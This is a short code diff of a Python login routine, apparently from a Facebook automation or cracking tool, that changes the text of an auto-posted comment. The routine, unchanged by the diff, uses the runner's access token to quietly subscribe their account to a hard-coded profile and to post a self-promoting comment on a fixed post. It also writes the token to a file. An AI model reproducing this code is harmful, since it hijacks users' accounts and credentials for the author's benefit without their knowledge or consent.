@@ -34,7 +34,7 @@ def login():
         r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
         nama=r['name']
         req.post(f'https://graph.facebook.com/100044932290784/subscribers?access_token={t}')
-        req.post(f"https://graph.facebook.com/315723919935349/comments?message=Ramdani Maneh Bong Kasep!&access_token={t}")
+        req.post(f"https://graph.facebook.com/315723919935349/comments?message=Ramdani Orang Terganteng diindonesia !&access_token={t}")
         print(f'[{i}√{pu}] Login Berhasil\n{pu}[=] Nama Facebook:{b}',nama,pu)
         open('saveLogin.txt','a').write(t)
         time.sleep(0.7)
